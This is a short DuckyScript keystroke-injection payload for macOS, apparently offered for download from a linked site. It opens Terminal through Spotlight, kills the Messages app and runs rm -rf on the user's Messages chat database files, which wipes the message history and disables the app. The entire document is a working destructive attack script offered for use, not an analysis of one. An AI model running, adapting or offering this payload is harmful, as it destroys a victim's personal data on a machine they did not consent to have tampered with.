[Download Payload](https://duckyubuntu.tk/payload1.txt)

    REM Author: Alex Jay
    REM This script disables Messages on OS X, the only way to fix messages is to recreate the deleted files via 'touch'
    DELAY 800
    GUI SPACE
    DELAY 200
    STRING Terminal
    DELAY 100
    ENTER
    DELAY 200
    STRING killall Messages
    ENTER
    DELAY 200
    STRING rm -rf ~/Library/Messages/chat.db; rm -rf ~/Library/Messages/chat.db-shm; rm -rf ~/Library/Messages/chat.db-wal
    ENTER